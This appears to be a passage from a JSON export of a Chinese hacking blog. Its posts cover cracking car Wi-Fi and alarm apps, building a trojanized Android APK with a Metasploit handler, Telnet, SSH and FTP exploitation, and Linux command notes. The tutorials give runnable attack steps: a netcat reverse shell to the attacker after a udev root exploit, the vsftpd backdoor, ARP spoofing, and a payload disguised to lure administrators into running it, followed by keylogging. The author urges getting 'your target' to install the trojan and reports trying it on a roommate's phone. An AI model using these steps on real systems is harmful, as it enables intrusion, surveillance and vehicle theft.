done\n\n执行，就可以看到汽车油门指针不断的向100跳跃。\n案例篇(原作者：https://www.hackers-arise.com/automobile-hacking)就是讲了一次入侵汽车系统的操作过程。\n这是视频地址：https://youtu.be/xHCUpLBGIKQ\n下面是分析：\nStep1：从车辆捕获低频信号\n这个种攻击通过一个射频（RF）链路转发来自车辆的低频（LF）信号。每个射频链路由一个发射器和一个接收器组成。\nStep2：将LF转换为2.5GHZ并发送到接收器\n发射器捕获车辆的低频（LF）信号并转换为2.5GHz。然后，该信号通过空中（最长100m）发送到接收器，该接收器再将其转换回LF信号。\nStep3：放大信号并发送到LF天线\n接收器处的LF信号被放大并发送到环路LF天线，该天线复制车辆最初发送的信号。然后使用环形LF天线传输信号以打开门，然后启动发动机。\n入侵汽车报警系统以控制车辆由于许多汽车使用的钥匙存在众所周知的漏洞，人们一直在通过购买汽车报警系统来弥补这一缺陷。\n许多这样的钥匙都可以被上面所讲述的中继攻击来入侵。因此，汽车报警器供应商一直在销售高端（有些高达5000美元）的汽车报警系统，以弥补这一风险，并标榜自己是 “不可破解的”（这就像在黑客面前挥舞红色斗篷一样）。\n事实证明，许多这样的报警系统实际上比车辆上的钥匙或其他数字系统更容易被黑。 \n最近，Pentest Partners证明他们只需篡改电子邮件用户重置选项的一些参数（一种微不足道的网络黑客技术）就足以控制这些系统。 \n下面是提供这些报警系统app之一的截图。正如你所看到的，这个应用程序使用户可以远程锁定、获得车辆地理定位和启动停止车辆。如果攻击者能够修改这个应用程序的用户，那么他们即使不是合法车主也可以做所有这些操作。\n\n参数篡改当Pentest Partners的成员在Viper报警系统上选择 “修改用户 “选项时，他们发现这个请求没有被正确验证，如下图所示。 \n因此，他们可以简单地发送一个POST请求来修改用户和密码并控制车辆。这可以通过BurpSuite、Paros Proxy或Tamper Data等代理工具完成。然后，合法用户被锁在自己的车外，黑客则可以控制车辆。 \n\n正如你在下面看到的，用户的电子邮件和密码被通过写好都漏洞利用脚本改成了攻击者想要的，现在攻击者可以随意解锁和启动、停止车辆。\n\nPandora案例在潘多拉公司（Pandora）的一个类似系统中，在 “修改用户 “选项中也发现了这种缺乏验证的情况。\n在这里，黑客可以简单地用他们自己的电子邮件地址修改 “电子邮件 “字段，并使用一个 “id “号码来发送一个更改用户和密码的请求。 \n\n正如你在下面看到的，黑客同样能够利用脚本改变用户的电子邮件地址和密码并控制车辆。\n\n随着运输系统日益数字化，汽车或车辆入侵攻击是网络安全的最前沿。 \n这些车辆的制造商正在犯15年前在传统IT系统中常见的，同样的错误。这些报警系统制造商犯了一个非常基本的错误，没有验证用户修改功能，使攻击者能够通过简单的参数篡改来控制 “受保护”的车辆。\n入侵三菱欧蓝德PHEV近年来，汽车已经变得越来越复杂。大多数汽车现在都有许多集成电路（IC）和大量的软件，既可以优化车辆的运行（例如燃料和氧气消耗、防抱死制动、自动感应和制动系统等），也可以为车主提供便利。随着这种复杂性和先进性的增加，脆弱性也随之增加了。 \n最近，来自英国Pentest Partners的白帽黑客注意到，三菱Outlander PHEV有一个应用程序，司机可以通过车内的Wi-Fi接入点（AP）进行连接。通常情况下，这种应用程序应该是要通过GSM或云技术连接来访问这车辆的控制系统的。而在欧蓝德上，则可以通过这个Wi-Fi接入点来访问一些车辆控制系统，包括报警系统、充电系统、灯光、风扇和温度控制等。 \n这意味着，如果我们或小偷能够连接到这个内置在车辆中的无线AP，那么盗窃报警系统就可以被禁用，以及做一些其他事情。使这辆车更加脆弱的是Wi-Fi的安全设计，或者说，安全实施不严格。 \n它存在以下几个明显的安全问题： \n\nWiFi接入点的密码记录在了车主手册中。 \n\n接入点的SSID都符合 “REMOTEnnaaaa “的规律，其中 “n “是任何数字，”a “是任何小写字母。 \n\n密码相对较短且简单，使其容易被暴力破解。\n\n\n寻找脆弱的三菱欧蓝德目标这款三菱欧蓝德的销量超过10万辆，所以你身边很可能就有一辆。当然，你可以简单地走在街上寻找它们，或者你可以按照这辆车所特有的SSID模式进行自动搜索。 我们可以使用无线地理记录引擎www.wigle.net（wigle.net对WiFi AP进行编目，并通过GPS坐标对其进行索引）。 \n在那里，我们可以使用Outlander的SSID的字符串模式，并选择按SSID搜索。当我这样做时发现了许多目标在wigle.net上搜索时，搜索字符串 “REMOTE______”，其中6个下划线代表：2个数字和4个字 母，如下所示。 \n\n正如你在下面看到的，我找到了许多符合这种模式的AP，大多数在西欧。我们可以通过在wigle.net中加入我们的GPS坐标来细化我们的搜索，以找到你所在地区的车辆。\n\n入侵欧蓝德的AP一旦我们找到了三菱欧蓝德，下一步就与任何使用aircrack-ng和hashcat的无线AP破解非常相似。首先，我们连接到AP，然后在4路握手包中提取获得密码哈希值，最后，开始暴力破解。让我们开始吧!\n首先，我们将使用Kali Linux 和aircrack-ng。我将使用一个旧的Alfa AWUS036H USB无线适配器，当然你可以使用任何你喜欢的兼容kali的无线网卡 \n第一步是检查无线连接。\niwconfig\n\n\n确定我的无线适配器是wlan0。 \n然后，我们需要将无线适配器调至监听模式\nairmon-ng start wlan0\n\n\n这里要注意的是，这个过程会无线适配器的名称改为mon0。 \n接下来，我们需要开始捕捉周围的无线流量。\nairodump-ng mon0\n\n\n\n\n正如你在上面的截图中所看到的，我们可以看到三菱的AP名为REMOTEaa1234。这就是我们的目标AP。 \n接下来我们需要在该信道上捕获该AP，并将捕获的PSK写入一个名为carhack的文件中。\nairodump-ng --bssid &lt;the AP BSSID&gt; -c &lt;the AP channel&gt; --write carhack mon0\n\n\n\n\n当车主连接到车上的AP时，我们在4路握手中捕获密码哈希值。 \n如果车主是已经连接的状态，可能就需要使用 aireplay-ng 的 deauth 功能来踢掉他们，当他们重新连接时，就可以捕获哈希值。 \n最后一步是破解这个哈希值。Aircrack-ng在破解WPA-PSK的哈希值方面不是特别好，但幸运的是，hashcat在这方面足够强大。 \n我们可以使用以下命令将cap文件carhack.cap转换为可用于hashcat的格式（.hccap）。\naircrack-ng &lt;the aircrack .cap file&gt; -J &lt;the hashcat .hccap file&gt;\n\n\n转换好的文件可以直接使用hashcat进行破解。\nPentest Partners的人用一台普通的单CPU笔记本电脑花了四天时间，但是用多个CPU，一个GPU集群或基于云的资源，你可以在几个小时内破解它。一旦我们用破解的PSK连接到欧蓝德的AP，我们就可以对车辆进行破坏和操作。\n结语此篇由3部分组成的文章只简述了入侵汽车的最基础知识，适合新手了解最基础进攻流程和概念。算了，玩的开心。\n得出结论，汽车安全方面的漏洞其实很多都是为了便利人们所造成的结果。就和web的漏洞很像，可能是因为这方面没有得到很好的重视所导致的。\n\n","slug":"汽车黑客入门","date":"2021-10-26T05:51:57.000Z","categories_index":"汽车黑客","tags_index":"汽车黑客入门","author_index":"Longw"},{"id":"46cf636a853cf895eb01f079c7dbe74c","title":"安卓远控","content":"\n\n\n\n写一点大家喜欢看的东西。。。。。。\n安卓远控远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术，这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。\n这次的安卓远控就是将正常的app嵌入恶意代码，当你安装这个app并且运行，那么我就能在网络上监控你。\n这个是在github上的开源的项目，地址是：https://github.com/cleverbao/520apkhook\n话不多说，打开kali，直接克隆。\n安装git clone https:&#x2F;&#x2F;github.com&#x2F;cleverbao&#x2F;520apkhook.git\n\n安装完成要注意你的kali的jdk版本必须为jdk1.8，这样才能运行这个程序。如何安装修改，我们直接百度。\nJava -version   #查看java版本\n\n使用cd 520apkhook\n\n我们打开文件夹，这个文件夹下面有一个Move to iOS_v3.2.0_apkfab.com.apk ，这是作者给你测试的软件。我们先将他重命名一下，改为随你便，我这里是：ceshi.apk\n在上面的基础上\npython3 hook.py --lhost &lt;kaliIP地址&gt; --lport 1433 -n .&#x2F;ceshi.apk\n\n然后，如果你环境满足的话，直接会到写那个，输入证书信息部分。\n[*] 创建app签名文件!\n您的名字与姓氏是什么?\n [Unknown]:  zhouhongyi\n您的组织单位名称是什么?\n [Unknown]:  360\n您的组织名称是什么?\n [Unknown]:  qihu360\n您所在的城市或区域名称是什么?\n [Unknown]:  beijing\n您所在的省&#x2F;市&#x2F;自治区名称是什么?\n [Unknown]:  beijing\n该单位的双字母国家&#x2F;地区代码是什么?\n [Unknown]:  china\nCN&#x3D;zhouhongyi, OU&#x3D;360, O&#x3D;qihu360, L&#x3D;beijing, ST&#x3D;beijing, C&#x3D;china是否正确?\n [否]:  y\n\n按照上面的填就行了，没有黑360的意思。完成后，会直接生成一个叫Final_Infected.apk 和 handler.rc 的程序和文件。那么这个时候就是展现你能力的时候了。让你的目标下载安装并且运行这个Final_Infected.apk 。\n那么当他运行时，我们在kali中就会收到会话。\nmsfconsole -r handler.rc\n\n直接运行脚本了，接下来当对方运行时。我们会收到会话。\nsessions -l   #查看会话\nsessions 1   #使用会话\n\n成功了，就能进行远程控制了。\n我借室友的手机实测了一下，在同一个wifi下，连接没有什么问题。并且安装app时，手机并没有报杀毒之类的。用了一下成功获得室友手机上安装的app的名单。那么接下来就有很多操作空间了。\n下一篇，就写最近看到的汽车黑客。\n\n","slug":"安卓远控","date":"2021-10-25T12:10:12.000Z","categories_index":"远控","tags_index":"github","author_index":"Longw"},{"id":"ee30e4a54bdc40c81ca3faa91eadc5d4","title":"Telnet漏洞","content":"\n\nTelnet介绍(直接复制粘贴)  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。\n  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。\n  Telnet服务端默认情况下使用23端口。\nTelnet版本获取使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。\nnmap -p23 -sV IP地址   #对IP23号端口进行探测\n\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun\n\nTelnet密码破解使用metasploit下针对telnet破解的模块进行用户名和密码的破解。\nmsfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun\n\nTelnet登录测试使用破解好的账户名和密码进行登录测试，并执行相应的命令。\n接上面的操作\nsessions -l \nsessioms -i id\n\nTelnet客户端连接Telnet服务器Windows下开启telnet客户端，连接telnet服务端。\ncmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录\n\nTelnet明文密码传输使用wireshark抓取telnet数据包\n在kali使用arp欺骗win10自己是主机，然后使用win10连接msf\n通过kali的wireshark抓包获取信息，通过分析找出密码，账号。\nmsf登录Telnet在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1\n\nmsf连接shell下载exp\n使用wget进行下载\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\n\n但是，这么下载好像不行。所以我们通过kali搭建环境下载。\n再开启一个终端\ncd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start \n\n然后，我们回到msf会话中\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载\n\n设置kali nc 监听\n使用netcat进行监听，后期返回的shell\nnc -lvp 4444\n\n我们要对程序进行编译执行exp，获取root权限\n再会话中\ngcc test.c -o exploit\n\n这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。\nrm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一\n\n执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。\nrm /tmp/run\nrm exploit\n有些操作前面写过不截图了，方便。其他操作自己看着办吧。\n\n","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"68847bc4d9b92f6bbe7e25411fa69ec3","title":"ssh漏洞利用","content":"\n\nSSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\nSSH安装我们使用ubuntu下载openssh_service服务\nsudo apt-get install openssh-server \n\n完成后使用以下命令开启关闭ssh服务\nservice ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务\n\nSSH客户端安装使用ubuntu搭建ssh客户端\nsudo apt-get install putty-tools\n\n然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。\nSSH banner信息获取\nnmap获取ssh banner信息\n\nnmap -sV -p 22 IP地址\n\n\nmetasploit获取ssh banner信息\n\nmsfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun\n\n\nnc获取ssh banner 信息\n\nnc IP地址 22\n\n配置ssh规避banner信息在ssh配置文件sshd_config中新增一行\nDebian Banner no  再次扫描就没有操作系统信息\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart \n\nmedusa ssh 弱口令破解如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。\nmedusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功\n\nSSH命令行工具登录一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）\nssh 用户名@IP地址\n\nmetasploit利用ssh登陆反弹shell使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆\n\nmetasploit获取meterpreter shell利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。\nsessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令\n\nSSH安全防御\nssh修改默认端口\n\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效\n\n\nssh设置pgp登陆\n\n在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)\n生成ssh密钥对，使用puttygen\n下载：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  可能不对，直接360下载。ok\n打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。\nssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去\n\n完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。\n在Auth里加载文件。\n输入IP地址和端口（刚刚已经改为了2222）\n直接连接。\n\nssh防御暴力破解用户账号\n\n在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。\n问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。\ncd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务\n\n\nIptable设置阈值防止暴力破解\n\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务\n\n表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。\n毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。\n因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。\n\n","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"add830c1c066eef908d48bdb9bf71238","title":"FTP漏洞利用","content":"\n\n​                                     开始记录一个安全漏洞利用\nFTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。\nFTP用户分类\nReal    一般用户   \n\nAdministrator  管理员\n\nAnonymous    匿名用户\n\n\nFTP文件传输格式\nASCII\n二进制格式\n\n利用FTP匿名登陆漏洞由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。\n本次靶机是windows2003企业版     攻击机为kali\n\n打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务\n\nnmap IP地址   \n\n\n扫描完成，发现开启了21号端口\n\n使用nmap进行漏洞扫描\n\nnmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本\n\n\n显示有匿名登陆漏洞，直接使用nc测试。\n\n使用nc进行FTP登陆\n\nnc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录\n\n\n成功登录靶机。\n利用FTP后门漏洞vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。\n本次靶机Metasploittable2-Linux     攻击机kali\n这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本\n\nnc连接\n\nnc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入\n\n\n发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口\n\nnc连接后门\n\nnc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户\n\n\n成功连接后门，并且拥有root权限。\nFTP安全配置\n修改配置文件，禁止匿名登录\n在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉\n在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词\n\n对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口\n打补丁直接更新版本就行\n禁止连接看下面的命令\niptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP\n\nFTP用户名密码暴力破解Windows下cmd命令添加用户，并提升为Administrator管理员权限\nnetuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组\n\nWindows下使用FTP服务器添加用户操作\n打开IIS服务，找到FTP，添加用户\n使用medusa暴力破解FTP登录\n本次靶机Windows2003企业版    攻击机kali\nmedusa -d    #查看可以使用的模块\n\n\n发现有FTP模块，利用FTP模块进行暴力破解\nmedusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解\n\n\n破解成功，发现用户名admin，密码admin测试登录看看。\n\n成功利用破解的用户名和密码登录。\nFTP用户名明文密码的验证FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。\n打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。\n\n接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.\n\n\n发现明文暴露出连接账户和密码信息，成功验证。\nFTP用户名密码明文嗅探刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？\n我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。\n打开终端使用arpspoof脚本\narpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102\n\n欺骗开始后不要动。。。。。。\n打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。\n打开kali另一终端，输入命令：ifconfig   查看mac地址\n再到win10中查看网关mac地址\n00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址\n\n发现一样，欺骗成功。\n在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。\nftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   \n\n登陆完成后，查看wireshark中中抓取的数据包。\n\n\n成功获得用户名和密码。。。。。。\nFTP登陆之后的事情讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。\nmsfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听\n\n生成的payload在/root/.set里面\ncd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面\n\n之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。\nsessions -l   #查看会话\nsessions -i x  #选择连接x号会话\n\nhelp   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录\n\n\n键盘输入情况演示\n因为图片加载不出来，自己试试看就知道了，这边就不放图片了。\n当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！\n防御\n禁止匿名用户登陆\n及时更新版本，防止老版本漏洞\n设置连接次数防止暴力破解\n密码明文，所以最好不适用FTP，用其他类似替代\n\n\n","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"5edbb0bb0225a5f787cc77b6741890ba","title":"Linux命令","content":"\n\nLinux命令学了好久了，还是不好记住，写个笔记方便查看吧。\n\nRed Hat专属快捷键ctrl+alt+F2   #切换为字符界面(F2~F7个命令行界面)\nctrl+alt+F1   #切换为图形界面\n\n基础命令快捷键反斜杠\\    #强制换行\nTAB    #自动补齐\nCTRL+U  #清空至行首\nCTRL+K  #清空至行尾\nCTRL+L  #清屏\nCTRL+C  #取消本次命令编辑\nxx --help  #查看xx的帮助信息\nman ls   #查看帮助\nuname -r  #查看内核\nuname -a  #查看系统\nwhich uname #当前目录\nhostname   #查看主机名\nifconfig  #查看网卡信息\ncat &#x2F;proc&#x2F;cpuinfo   #查看cpu信息\ncat &#x2F;proc&#x2F;meminfo   #查看内存信息\nreboot  #重启\nshutdown -h now   #立刻关机\npwd   #查看当前目录\n\ncd命令   切换目录cd    #切换目录\ncd &#x2F;etc&#x2F;httpd    #绝对路径\ncd abc    #相对路径\n\nls命令   查看文件ls  #查看目录的文件\nls -l  #详细查看\nls -a  #查看全部文件\nls -h  #察看文件大小\nls -alh  #就上面全部\n\ndu命令   查看文件大小du  #查看当前文件夹大小\ndu -a   #统计时包括所有文件，不仅仅只统计目录\ndu -h   #以更易读懂的字节单位(k,m等)显示信息\ndu -s   #只统计每个参数所占用的空间总的大小\n\nmkdir命令   创建目录mkdir   #创建新目录\nmkdir -p &#x2F;路径名&#x2F; 目录名   #创建目录\n\ntouch命令  创建文件touch  #新建空文件或更新文件时间标记\ntouch 文件名  #新建文件\n\nln命令   建立连接ln    #为文件或目录建立链接(link)\nln -s 源文件或目录 -----&gt; 链接目录   #创建链接\n-s表示建立符号链接文件(省略此项则建立硬链接)\n\ncp命令   复制文件cp   #复制文件或目录\ncp 【选项】 源文件目录 目标文件目录  \n-r  #递归复制整个目录\n-f   #强制覆盖目标同名文件或目录\n-p   #保持源文件的属性不变\n-i   #需要覆盖文件或目录时进行提醒\n\nrm命令   删除文件rm   #删除\nrm 【选项】 文件目录\n-f  #强制删除文件&#x2F;目录,不进行提醒\n-i  #删除文件或目录时提醒用户确认\n-r  #表示递归\n\nmv命令   移动文件mv 【选项】 源文件&#x2F;目录 目标文件&#x2F;目录   #移动文件\n-b   #当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i   #如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f   # 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n   #不要覆盖任何已存在的文件或目录。\n-u   #当源文件比目标文件新或者目标文件不存在时，才执行移动操作\n\nfind命令     查找文件find   #用于查找文件或目录\nfind 查找范围 查找文件\n-name  #按照文件名查找\n-size #按照文件大小查找\n-uesr #按照文件属主查找\n-type #按照文件类型查找\n\nvi命令   编辑文件vi   #表示进入\nvi 【选项】 【t[n]】 【file】\n-r   #用于恢复系统忽然崩溃时正在编辑的文件\n-R   #用于只读方式打开文件\n+n   #用来指明进入vi后直接位于文件的第几行，如不指定n则位于最后一行\na  #在光标后附近文本\nA  #在本行行末附加文本\ni  #在光标前插入文本\nI  #在光标开始时插入文本\no  #在光标下插入新行\nO  #在光标上插入新行\n&#x2F;string 向下 向前搜索指定字符串搜索时忽略大小写\n？  向上\nn  搜索指定字符串的下一个出现位置\n:%s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #全文替换为指定字符串，g表示不提示，s表示搜索，%表示全部\n:n1,n2s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #在一定范围替换指定字符串，n1到n2行\nU  #返回的上一步\n:set nu   #显示行号\n:q    #直接退出\n:wq   #保存后退出\n:q!   #强制退出\n:.   #重复上一个命令\nD   #光标到行尾全部删除\ndd   #删除光标在的那一行\np   #粘贴dd删除的那一行\n\ncat命令   查看文件cat   #显示文件的全部内容\n-n   #给输出的所有行加上编号\ncat 1 2 &gt; 3   #合并文件\n\nwc命令    统计文件内容wc   #统计文件中的单次数量字节数行数\n-I  #统计行数\n-w  #统计单词数\n-c  #统计字符数\nwc sdxh.txt   #会出现 2 4 26,2是行数，4是单词数，26是字符数\nhistory   #查看历史命令\n\ngzip和bzip2命令  压缩文件gzip   bzip2   #都是归档和压缩文件命令\n只针对单个文件压缩\n-g   #显示高压缩比\n-d   #释放压缩文件\ngzip 文件名 压缩文件     #格式为后缀有.gz\nbzip2 文件名 压缩成的文件名  #格式为 文件.bz2,他相对于gzip压缩率更高\n\ntar命令   解压压缩文件tar\ntar -tvf 4.tar -r   #追加TAR文件到归档结尾\ntar -rvf 4.tarr 5   #把5加入到4.tar\n-p  #解包时保留原始文件及目录的权限\n-C  #解包时指定释放的目录文件夹\n-z  #调用gzip程序进行解压或压缩\n-j  #调用bzip2程序进行解压或压缩\ntar -cvzf test.ter.gz 被压缩的文件1 被压缩的文件2   #创建归档压缩文件后缀为bz2\ntar -xvzf test.tar.gz -C &#x2F;usr&#x2F;src  #解压释放归档到&#x2F;usr&#x2F;src里面\ntar -xvjf test.tar.bz2 -C &#x2F;usr&#x2F;src   #解压释放归档到&#x2F;usr&#x2F;src里面\n-c   #创建归档文件扩展名为.tar\n-v   #输出详细信息\n-f   #表示使用归档文件    如-cvf   创建归档文件\ntar -cvf 4.tar 1 2 3   #将文件1 2 3 打包归档为4.tar\ntar -xvf 4.tar    #解包归档文件4.tar\n-xvf   #解包归档文件\n-x    #解开归档文件\n-t    #列表查看包内文件(不释放解包)\n\nchmod 命令   修改权限chmod 777 文件名   #提升权限\nr     #4  表示读\nw    #2  表示写\nx    #1  表示可执行 \n777   #表示任何人都拥有所有权限\n\n编译安装过程下载源代码安装文件包文件\n1： tar解包\n2： 